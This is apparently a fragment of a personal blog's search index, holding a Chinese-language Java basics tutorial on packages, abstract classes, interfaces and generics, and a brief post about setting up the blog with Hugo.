HelloWorld(); hello.sayHello(); } } 使用 IntelliJ IDEA (IJ)# 创建新项目： 打开IJ，选择“File” -\u0026gt; “New” -\u0026gt; “Project”，选择Java项目，点击“Next”完成项目创建。 创建新类： 在项目的src目录下右键，选择“New” -\u0026gt; “Java Class”，输入类名（如HelloWorld），然后点击“OK”。 编写代码： 在打开的编辑器窗口中，输入上述示例代码。 运行程序： 右键点击编辑器中的类文件，选择“Run \u0026lsquo;HelloWorld.main()\u0026rsquo;”来运行程序。 或者点击工具栏上的绿色三角形按钮运行程序。 包和import# 在Java中，包（package）是用来组织类和接口的一种机制，类似于文件系统的文件夹结构。导入（import）语句则允许你在当前类中使用其他包中的类或接口。下面详细介绍如何声明包和导入其他包中的类，并附带例子。\n如果一个保重的类要想被其他包中的类所使用，那么这个类一定要定义为public class，而不嫩使用class声明，因为class声明的类只能够在同一个包中使用 。\npublic class：文件名称和类名称保持一致，在一个.java文件中只能存在一个public class定义，如果一个类要想被外部的包所访问必须定义为public。*\n*class:文件名称可以和类名称不一致，在一个*java中可以同时存在多个class定义，并且编译完成之后会形成多个 .class文件，使用class定义的类只能够在一个包中访问，不同包无法访问\n包的本质是目录\n1. 声明包# 每个Java源文件都可以属于一个包。包声明必须是源文件中的第一行非注释代码。语法如下：\npackage 包名; 例如，如果你希望将你的类放在 com.example 这个包中，可以在文件的开头这样声明：\npackage com.example; 2. 导入其他包中的类# 单个类导入# 如果你想导入某个包中的单个类，可以使用以下语法：\nimport 包名.类名; 例如，如果你想导入 java.util 包中的 ArrayList 类，可以这样写：\nimport java.util.ArrayList; 多个类导入# 如果你想导入某个包中的多个类，可以逐个导入，也可以使用通配符 * 导入整个包中的所有类。语法如下：\nimport 包名.*; 例如，如果你想导入 java.util 包中的所有类，可以这样写：\nimport java.util.*; 注：# 在java中无论使用\u0026#34;import 包.*\u0026#34; 导入或者是单独导入，从实际的操作性能上来讲是没有任何区别的，因为即使使用了\u0026#34;*\u0026#34;也表示只导入所需要的类，不需要的并不导入。 3. 静态导入# 静态导入允许你直接使用类中的静态成员（方法或变量），而不需要指定类名。语法如下：\nimport static 包名.类名.静态成员名; 例如，如果你想导入 Math 类中的 PI 常量和 sqrt 方法，可以这样写：\nimport static java.lang.Math.PI; import static java.lang.Math.sqrt; 然后你可以在代码中直接使用 PI 和 sqrt，而不需要前缀 Math：\ndouble result = sqrt(16) * PI; 完整示例# 假设你有一个项目结构如下：\nsrc/ ├── com/ │ └── example/ │ ├── Main.java │ └── Person.java Person.java# package com.example; public class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } @Override public String toString() { return \u0026#34;Person{name=\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;, age=\u0026#34; + age + \u0026#34;}\u0026#34;; } } Main.java# package com.example; import java.util.ArrayList; import java.util.List; public class Main { public static void main(String[] args) { List\u0026lt;Person\u0026gt; people = new ArrayList\u0026lt;\u0026gt;(); people.add(new Person(\u0026#34;Alice\u0026#34;, 30)); people.add(new Person(\u0026#34;Bob\u0026#34;, 25)); for (Person person : people) { System.out.println(person); } } } 解释# 包声明： Person.java 和 Main.java 都声明了 package com.example;，表示它们属于 com.example 包。 导入语句： Main.java 中导入了 java.util.ArrayList 和 java.util.List，以便在代码中使用这些类。 类和方法： Person 类定义了一个简单的 Person 对象，包含姓名和年龄。 Main 类中的 main 方法创建了一个 Person 对象列表，并打印每个对象的信息。 总结注：# 如果同时导入了不同包中名称相同的类，这时候就使用的时候就需要使用这个类的完整名称。\n如：hh.gg.util.Message msg = new hh.gg.util.Message();\n利用静态导入的优点在于，不同类的静态方法就好像在主类定义的一样，不需要类名称就可以直接进行调用。\njar文件# java中的压缩文件格式，即可以将*class文件以 *jar压缩包的形式给用户。\njar --help 用法: jar [OPTION...] [ [--release VERSION] [-C dir] files] ... jar 创建类和资源的档案, 并且可以处理档案中的 单个类或资源或者从档案中还原单个类或资源。 示例: # 创建包含两个类文件的名为 classes.jar 的档案: jar --create --file classes.jar Foo.class Bar.class # 使用现有的清单创建档案, 其中包含 foo/ 中的所有文件: jar --create --file classes.jar --manifest mymanifest -C foo/ . # 创建模块化 jar 档案, 其中模块描述符位于 # classes/module-info.class: jar --create --file foo.jar --main-class com.foo.Main --module-version 1.0 -C foo/ classes resources # 将现有的非模块化 jar 更新为模块化 jar: jar --update --file foo.jar --main-class com.foo.Main --module-version 1.0 -C foo/ module-info.class # 创建包含多个发行版的 jar, 并将一些文件放在 META-INF/versions/9 目录中: jar --create --file mr.jar -C foo classes --release 9 -C foo9 classes 要缩短或简化 jar 命令, 可以在单独的文本文件中指定参数, 并使用 @ 符号作为前缀将此文件传递给 jar 命令。 示例: # 从文件 classes.list 读取附加选项和类文件列表 jar --create --file my.jar @classes.list 主操作模式: -c, --create 创建档案 -i, --generate-index=FILE 为指定的 jar 档案生成 索引信息 -t, --list 列出档案的目录 -u, --update 更新现有 jar 档案 -x, --extract 从档案中提取指定的 (或全部) 文件 -d, --describe-module 输出模块描述符或自动模块名称 --validate Validate the contents of the jar archive. This option will validate that the API exported by a multi-release jar archive is consistent across all different release versions. 在任意模式下有效的操作修饰符: -C DIR 更改为指定的目录并包含 以下文件 -f, --file=FILE 档案文件名。省略时, 基于操作 使用 stdin 或 stdout --release VERSION 将下面的所有文件都放在 jar 的版本化目录中 (即 META-INF/versions/VERSION/) -v, --verbose 在标准输出中生成详细输出 在创建和更新模式下有效的操作修饰符: -e, --main-class=CLASSNAME 捆绑到模块化或可执行 jar 档案的独立应用程序 的应用程序入口点 -m, --manifest=FILE 包含指定清单文件中的 清单信息 -M, --no-manifest 不为条目创建清单文件 --module-version=VERSION 创建模块化 jar 或更新 非模块化 jar 时的模块版本 --hash-modules=PATTERN 计算和记录模块的散列, 这些模块按指定模式匹配并直接或 间接依赖于所创建的模块化 jar 或 所更新的非模块化 jar -p, --module-path 模块被依赖对象的位置, 用于生成 散列 只在创建, 更新和生成索引模式下有效的操作修饰符: -0, --no-compress 仅存储; 不使用 ZIP 压缩 --date=TIMESTAMP The timestamp in ISO-8601 extended offset date-time with optional time-zone format, to use for the timestamps of entries, e.g. \u0026#34;2022-02-12T12:30:00-05:00\u0026#34; 其他选项: -?, -h, --help[:compat] 提供此帮助，也可以选择性地提供兼容性帮助 --help-extra 提供额外选项的帮助 --version 输出程序版本 如果模块描述符 \u0026#39;module-info.class\u0026#39; 位于指定目录的 根目录中, 或者位于 jar 档案本身的根目录中, 则 该档案是一个模块化 jar。以下操作只在创建模块化 jar, 或更新现有的非模块化 jar 时有效: \u0026#39;--module-version\u0026#39;, \u0026#39;--hash-modules\u0026#39; 和 \u0026#39;--module-path\u0026#39;。 如果为长选项提供了必需参数或可选参数, 则它们对于 任何对应的短选项也是必需或可选的 抽象类# 一.关键字及定义# 抽象类使用abstrat class进行定义，并且在一个抽象类中也可以利用abstract关键词定义若干个抽象方法，这样抽象类的子类就必须在继承抽象类时强制覆写全部抽象方法。 抽象类并不是一个完整的类，对于抽象类的使用需要按照以下原则进行。\n​\t\u0026mdash;-抽象类必须提供有子类，子类使用extends继承一个抽象类\n​\t\u0026mdash;-抽象类的子类（不是抽象类）一定要覆写抽象类的全部抽象方法。\n​\t\u0026mdash;-抽象类的对象实例化可以利用对象多态性通过子类向上转型的方法完成\n二.抽象类的相关说明（有参无参构造）# ​\t(1) 抽象类必须由子类继承，所以在定义时，不允许使用final关键字定义抽象类或抽象方法。\n补充final关键字\nfinal修饰的类不能被继承。 final修饰的方法不能被子类重写。 final修饰的变量只能被赋值一次，且对于引用类型来说，是指向的地址不能变，但对象的状态可以改变。 final变量可以提高并发程序的安全性和性能。 ​\t(2) 抽象类中可以定义成员属性与普通方法，为了可以为抽象类中的成员属性初始化，可以在抽象类中提供构造方法。子类在继承抽象类时会默认调用父类的无参构造，如果抽象类没有提供无参构造方法，则子类必须通过super()的形式调用指定参数的构造方法。\n代码示例\nabstract class Message{ private String type;//消息类型 public Message(String type) { this.type = type; } public abstract String getConnectionInfo(); public String getType(){ return type; } } class DatabaseMessage extends Message{ public DatabaseMessage(String type){ super(type);//调用单参构造。 } @Override public String getConnectionInfo() { return \u0026#34;[\u0026#34; + super.getType() +\u0026#34;]数据库连接信息。\u0026#34;; } } public class JavaDome { public static void main(String[] args) { Message message = new DatabaseMessage(\u0026#34;Java\u0026#34;);//向上转型 System.out.println(message.getConnectionInfo()); } } 这里补充些有参无参构造知识\n抽象类： 抽象类是不能被实例化的类，它通常包含一个或多个抽象方法（没有具体实现的方法）。 抽象类可以包含成员属性、普通方法和构造方法。\n构造方法： 构造方法用于初始化对象的属性。 抽象类中的构造方法可以用于初始化抽象类中的成员属性。\n子类继承抽象类 当一个子类继承抽象类时，子类的构造方法会自动调用父类的构造方法。具体规则如下：\n​\t默认调用无参构造方法：\n如果父类有无参构造方法，子类的构造方法会默认调用父类的无参构造方法。 如果父类没有无参构造方法，子类必须显式调用父类的有参构造方法。 ​\t显式调用有参构造方法：\n如果父类只有有参构造方法，子类必须在构造方法中使用 super() 显式调用父类的有参构造方法。 super() 必须是子类构造方法中的第一条语句。 注：\n如果你在抽象类中定义了有参构造方法，而没有定义无参构造方法，那么编译器不会自动生成默认的无参构造方法。这意味着子类在继承该抽象类时，必须显式调用父类的有参构造方法。 默认无参构造方法： 在Java中，如果你没有定义任何构造方法，编译器会自动为你生成一个无参构造方法。这个无参构造方法是默认的，不带任何参数。 自定义构造方法： 一旦你定义了任何一个构造方法（无论是有参还是无参），编译器就不会再生成默认的无参构造方法。因此，如果你需要无参构造方法，必须显式地定义它。 ​\t(3) 抽象类中允许没有抽象方法，即便没有抽象方法。也无法直接使用关键字new直接实例化抽象类对象\n​\t(4) 抽象类中可以提供static方法，并且该类方法不受到抽象类实例化对象的限制。\n代码示例\nabstract class Message{ public abstract String getInfo(); public static Message getInstance(){ return new DatabaseMessage(); } } class DatabaseMessage extends Message{ @Override public String getInfo(){ return \u0026#34;hello\u0026#34;; } } public class JavaDome1 { public static void main(String[] args) { Message msg = Message.getInstance();//静态直接调用 System.out.println(msg.getInfo()); } } 包装类# 这里就演示一个double类型的装箱和拆箱\npublic class JavaDemo{ public static void main(String args[]){ Double obj = new Double(10.1);//装箱 double num = obj.doubleValue();//拆箱 System.out.println(num*num); } } //其他包装的基本数据类型是同理 注：\nJDK1.5以前是必须的操作，JDK1.5之后，java提供了自动装箱和拆箱机制，并且包装类的对象可以自动进行数学计算了。 JDK1.9出现了过期声明。也就说明后面的都是自动装箱。 自动装箱\npublic class JavaDome{ public static void main(String args[]){ Integer obj = 10;//自动装箱，无需关注构造方法了。 int num = obj;//自动拆箱，等价于调用了intValue()方法。 obj++;//包装类对象可以直接参与数学运算。 System.out.println(num*obj); } } 接口# 定义# ​\t接口在实际开发中是由一种比抽象类更为重要的结构组成，接口的主要特点在于其用于定义开发标准，同时接口在JDK1.8之后也发生了重大变革。\n关键字# interface\njava中接口属于一种特殊的类，需要通过interface关键字进行定义，在接口中可以定义全局常量、抽象方法（必须是public访问权限）、default方法以及static方法。\n接口中的方法默认是抽象的。\n示例\n//由于类名称与接口名称的定义要求相同，所以为了区分出接口，往往会在接口名称前加入字母I（interface） interface IMessage{\t//定义接口 public static final String INFO = \u0026#34;hh\u0026#34;;//全局变量 public abstract String getInfo();//抽象方法 } 本程序定义一个IMessage接口，由于接口中存在有抽象方法，所以无法被直接实例化。其使用规则如下。 接口需要被子类实现，子类利用implements关键字可以实现多个父接口 子类如果不是抽象类，那么一定要覆写接口中的全部抽象方法 接口对象可以利用子类对象的向上转型进行实例化 注：# 子类可以继承父类也可以实现父接口，其基本语法如下: class 子类[extends 父类][implements 接口1,接口2，...]{} 如果出现混合应用，则要采用先继承(extends)再实现(implements)的顺序完成，同时一定要记住，子类接口的最大特点在于可以同时实现多个父接口，而每一个子类只能通过extends继承一个父类 感觉写法上跟继承差不多 接口的转型# ​\t接口和Object之间没有任何关系，但是如果有子类实现了这些接口和默认继承了Object父类，所以该子类向上转型的实例就可以进行任意父类接口转型。\n接口的简化定义# ​\t在进行接口定义时，对于全局常量和抽象方法可以按照一下形式简化\ninterface IMessage{ public static final String INFO = \u0026#34;gg\u0026#34;; public abstract String getInfo(); } //简化定义 interface IMessage{ String INFO = \u0026#34;gg\u0026#34;; String getInfo(); } 作用完全相同，但是建议保留public，这样定义会更清楚 ​\t在面向对象的设计中，抽象类是一种必不可少的结构，利用抽象类可以实现一些公共方法的定义。可以利用extends先继承父类再利用implements实现若干父接口的顺序完成子类的定义。\n在Java中，接口中的成员属性（字段）默认是 public、static 和 final 的。这意味着： 公共的（public）：可以在任何地方访问。 静态的（static）：属于接口本身，而不是接口的实例。可以通过接口名称直接访问这些字段。 最终的（final）：一旦赋值后不能更改。 因此，接口中的成员属性实际上是常量，通常用于定义一些固定的值，供实现该接口的类使用。 extends继承多个父接口# ​\tjava中的extends关键字除了具有类继承作用以外，也可以在接口上使用以实现接口的继承关系，并且可以同时实现多个父接口。\n示例\ninterface Imessage{ public static final String INFO = \u0026#34;hh\u0026#34;;//全局常量 public abstract String getInfo(); } interface IChannel{ public boolean connect();//抽象方法 } //extends在类继承上只能够继承一个父类，但是接口上可以继承多个。 interface IService extends IMessage,IChannel{ public String service(); } class MessageService implement IService{ @Override public String getInfo(){ return IMessage.INFo; } @Override public boolean connect(){ return true; } @Override public String service(){ return \u0026#34;hello\u0026#34;; } } 接口定义的加强（default、static）# JDK1.8以后，接口中的组成出了提供全局常量和抽象方法之外。还可以使用default定义普通方法或者使用static定义静态方法\ninterface IMessage{ public String message();//抽象方法 public default boolean connect(){\t//普通方法，可以被子类继承和覆写 System..out.println(\u0026#34;建立\u0026#34;); return true; } } class MessageImpl implements IMessage{ public String message(){ return \u0026#34;hh\u0026#34;; } } public class JavaDome{ public static void main(){ IMessage msg = new MessageImpl(); if(msg.connect()){ System.out.println(msg.message()); } } } static# 使用default定义的普通方法需要通过接口实例化对象才可以调用，而为了避免实例化对象的依赖。在接口中也可以使用static定义的方法，此方法可以直接利用接口名称调用。\n注：# 接口在整体设计上是针对类的进一步抽象，其设计层次也要高于抽象类99 设计模式# 工厂设计模式# 最终最好都是用工厂设计模式来获取实例对象\nclass Factory{ public static IEat getInstance(){ return new EatProxy(new EatReal()); } } public class JavaDome{ public static void main(Sring arg[]){ IEat eat = Factory.getInstance(); eat.get(); } } 代理设计模式# No. 区别 抽象类 接口 1 关键字 abstract、class interface 2 组成 常量、变量、抽象方法、普通方法、构造方法 全局常量、抽象方法、普通方法、静态方法 3 权限 可以使用各种权限 只能是public 4 关系 一个抽象类可以实现多个接口 接口不能够继承抽象类，却可以继承多接口 5 使用 子类使用extends继承抽象类、抽象类和接口的对象都是利用对象多态性的向上转型，进行接口或者抽象类的实例化操作 子类使用implements实现接口、抽象类和接口的对象都是利用对象多态性的向上转型，进行接口或者抽象类的实例化操作 6 设计模式 模版设计模式 工厂设计模式、代理设计模式 7 局限 一个子类只能继承一个抽象类 一个子类可以实现多个接口 泛型# 泛型设计的核心思想在于：类中的属性或方法的参数与返回值的类型采用动态标记，在对象实例化的时候动态配置于鏊使用的数据类型\n泛型可以定义在任意的程序结构体中\n泛型是Java中的一种强大特性，它允许你在定义类、接口和方法时使用类型参数，从而提高代码的复用性和类型安全性。以下是关于泛型的一些关键点和示例：\n泛型的基本概念# 类型参数：用大写字母表示，如 T、E、K、V 等。 泛型类：使用类型参数定义类。 泛型接口：使用类型参数定义接口。 泛型方法：使用类型参数定义方法。 泛型集合：使用泛型来指定集合中存储的元素类型。 泛型类# public class Box\u0026lt;T\u0026gt; { private T item; public Box(T item) { this.item = item; } public T getItem() { return item; } public void setItem(T item) { this.item = item; } } public class Test { public static void main(String[] args) { Box\u0026lt;String\u0026gt; stringBox = new Box\u0026lt;\u0026gt;(\u0026#34;Hello\u0026#34;); System.out.println(stringBox.getItem()); // 输出: Hello Box\u0026lt;Integer\u0026gt; integerBox = new Box\u0026lt;\u0026gt;(123); System.out.println(integerBox.getItem()); // 输出: 123 } } 泛型接口# public interface Container\u0026lt;T\u0026gt; { void add(T item); T get(int index); } public class ArrayListContainer\u0026lt;T\u0026gt; implements Container\u0026lt;T\u0026gt; { private List\u0026lt;T\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); @Override public void add(T item) { list.add(item); } @Override public T get(int index) { return list.get(index); } } public class Test { public static void main(String[] args) { Container\u0026lt;String\u0026gt; stringContainer = new ArrayListContainer\u0026lt;\u0026gt;(); stringContainer.add(\u0026#34;Hello\u0026#34;); System.out.println(stringContainer.get(0)); // 输出: Hello Container\u0026lt;Integer\u0026gt; integerContainer = new ArrayListContainer\u0026lt;\u0026gt;(); integerContainer.add(123); System.out.println(integerContainer.get(0)); // 输出: 123 } } 泛型方法# public class Util { public static \u0026lt;T\u0026gt; void printArray(T[] array) { for (T item : array) { System.out.print(item + \u0026#34; \u0026#34;); } System.out.println(); } } public class Test { public static void main(String[] args) { String[] stringArray = {\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;}; Util.printArray(stringArray); // 输出: Hello World Integer[] integerArray = {1, 2, 3}; Util.printArray(integerArray); // 输出: 1 2 3 } } 泛型约束# 你可以使用泛型约束来限制类型参数的范围，确保传入的类型满足某些条件。\npublic class Box\u0026lt;T extends Number\u0026gt; { private T item; public Box(T item) { this.item = item; } public T getItem() { return item; } public void setItem(T item) { this.item = item; } public double getDoubleValue() { return item.doubleValue(); } } public class Test { public static void main(String[] args) { Box\u0026lt;Integer\u0026gt; integerBox = new Box\u0026lt;\u0026gt;(123); System.out.println(integerBox.getDoubleValue()); // 输出: 123.0 // Box\u0026lt;String\u0026gt; stringBox = new Box\u0026lt;\u0026gt;(\u0026#34;Hello\u0026#34;); // 编译错误，String 不是 Number 的子类 } } 通配符# 通配符 ? 用于表示未知类型，可以进一步限定其范围。\n无界通配符：表示未知类型。 上界通配符：\u0026lt;? extends T\u0026gt;表示类型是T 或其子类。 下界通配符：\u0026lt;? super T\u0026gt;表示类型是T 或其父类。 public class Util { public static void printList(List\u0026lt;?\u0026gt; list) { for (Object item : list) { System.out.print(item + \u0026#34; \u0026#34;); } System.out.println(); } public static void addNumbers(List\u0026lt;? super Integer\u0026gt; list) { list.add(1); list.add(2); } } public class Test { public static void main(String[] args) { List\u0026lt;Object\u0026gt; objectList = new ArrayList\u0026lt;\u0026gt;(); Util.addNumbers(objectList); Util.printList(objectList); // 输出: 1 2 List\u0026lt;Number\u0026gt; numberList = new ArrayList\u0026lt;\u0026gt;(); Util.addNumbers(numberList); Util.printList(numberList); // 输出: 1 2 } } 总结# 泛型类：使用类型参数定义类，提高代码复用性和类型安全性。 泛型接口：使用类型参数定义接口，增强接口的灵活性。 泛型方法：使用类型参数定义方法，使方法更加通用。 泛型约束：限制类型参数的范围，确保类型安全。 通配符：处理不确定类型的场景，增强代码的灵活性。 注：# 在面向对象的程序设计中,Object类可以接收一切的数据类型。但是在泛型的概念中：Message\u0026lt;String\u0026gt;与Message\u0026lt;Object\u0026gt;属于两个不同的类型。 辨析两种细节：# 1.public static void fun(Message\u0026lt;Object\u0026gt; temp){} 2.public static void fun(Message temp){} //使用1这种方式定义接收参数，表示fun()方法只能够接收Message\u0026lt;Object\u0026gt;类型的引用 //使用2这种方式定义接收参数，不在fun()方法上设置泛型类型，实际上可以解决不同泛型类型的对象传递问题，但同时也会有新的问题产生：允许随意修改数据 ---示例： public class JavaDemo{ public static void main(String args[]){ Message\u0026lt;String\u0026gt; msg = new Message\u0026lt;String\u0026gt;(); msg.setContent(\u0026#34;hh\u0026#34;); fun(msg); } } //不设置泛型类型，表示可以接收任意的泛型类型对象 //默认泛型类型为Object,但不等同于Message\u0026lt;Object\u0026gt; public static void fun(Message temp){ //原始类型为String,现在设置Interger temp.setContent(18); System.out.println(temp.getContent()); } //虽然可以接收，但是无法对修改做出控制，而使用通配符\u0026#34;?\u0026#34;的泛型只允许获取，不允许修改。 泛型约束# 类和方法\n设置泛型的上限(?extends类)：只能够使用当前类或者当前类的子类设置泛型类型。 ?extends Number:可以设置Number或Number子类（例如Integer、Double） 方法\n设置泛型的下线(?super类)：只能够设置指定的类或者指定类的父类。 ?super String:只能够设置String或String的父类Object 泛型接口# 泛型接口在进行子类定义时就有两种实现方式：在子类中继续声明泛型和子类中为父类设置泛型类型 ","date":"2024-11-17","id":10,"permalink":"/blog/java_base/","summary":"java文件结构快速了解# Java 文件的基本结构# 一个简单的Java文件通常包含以下几个部分：\n包声明：\n每个Java源文件都属于某个包。包的作用类似于文件夹，用于组织和分类相关的类。 示例：package com.example; 导入语句：\n导入语句用于引入其他包中的类或接口，这样可以在当前文件中直接使用这些类或接口。 示例：import java.util.ArrayList; 类声明：\n类是Java程序的基本构建块。每个类定义了一组属性（变量）和方法（函数）。\n示例：\npublic class HelloWorld { // 类体 } 构造方法：\n构造方法是一种特殊的方法，用于创建类的新实例时初始化对象。\n示例：\npublic HelloWorld() { // 初始化代码 } 属性（成员变量）：\n属性是类中存储数据的变量。\n示例：\nprivate String name; 方法：\n方法是执行特定任务的代码块。\n示例：\npublic void sayHello() { System.out.println(\u0026#34;Hello, World!\u0026#34;); } 主方法（main方法）：\n主方法是Java应用程序的入口点。当程序启动时，JVM会寻找并执行这个方法。\n示例：\njava深色版本\npublic static void main(String[] args) { HelloWorld hello = new HelloWorld(); hello.sayHello(); } 示例代码# 以下是一个完整的Java文件示例，结合了上述各个部分：\n","tags":["Blog","java_base"],"title":"Java Base"},{"content":"搭建博客的原因# 感觉身为搞计算机的人要是没有个个人博客，总是缺少些什么。也是为了增加自己学习的动力吧，带来一些成就感。随便记录一下\u0026quot;lifelong journey\u0026quot;中的一些感受和经历。当然主要用于学习记录。\n心得# 这次搭建这个博客花费的时间成本挺大的，前前后后一个星期左右，从了解到尝试，主题试过好多个，后悔没有先去了解项目特点再去搭建，中途差错不断，改了又改，删了又删，一次次都在放弃的边缘。可能读到这儿的小伙伴可能会有疑问，hugo不是快速建站吗，我觉得建站确实快，但是调整一些个性化的东西可太磨人了，稍不注意就错了，然后可能都不知道为什么崩了。hugo版本也是奇特，建议大家了解清楚自己主题和版本的一些兼容性问题，不然可能要重蹈我的覆辙了。这里也温馨提示大家，了解清楚hugo对目录的设定情况，不然路径对不了。而且我也真真意识到备份的重要性。\n","date":"2024-11-16","id":11,"permalink":"/blog/hello/","summary":"搭建博客的原因# 感觉身为搞计算机的人要是没有个个人博客，总是缺少些什么。也是为了增加自己学习的动力吧，带来一些成就感。随便记录一下\u0026quot;lifelong journey\u0026quot;中的一些感受和经历。当然主要用于学习记录。\n心得# 这次搭建这个博客花费的时间成本挺大的，前前后后一个星期左右，从了解到尝试，主题试过好多个，后悔没有先去了解项目特点再去搭建，中途差错不断，改了又改，删了又删，一次次都在放弃的边缘。可能读到这儿的小伙伴可能会有疑问，hugo不是快速建站吗，我觉得建站确实快，但是调整一些个性化的东西可太磨人了，稍不注意就错了，然后可能都不知道为什么崩了。hugo版本也是奇特，建议大家了解清楚自己主题和版本的一些兼容性问题，不然可能要重蹈我的覆辙了。这里也温馨提示大家，了解清楚hugo对目录的设定情况，不然路径对不了。而且我也真真意识到备份的重要性。\n","tags":[],"title":"Hello"}]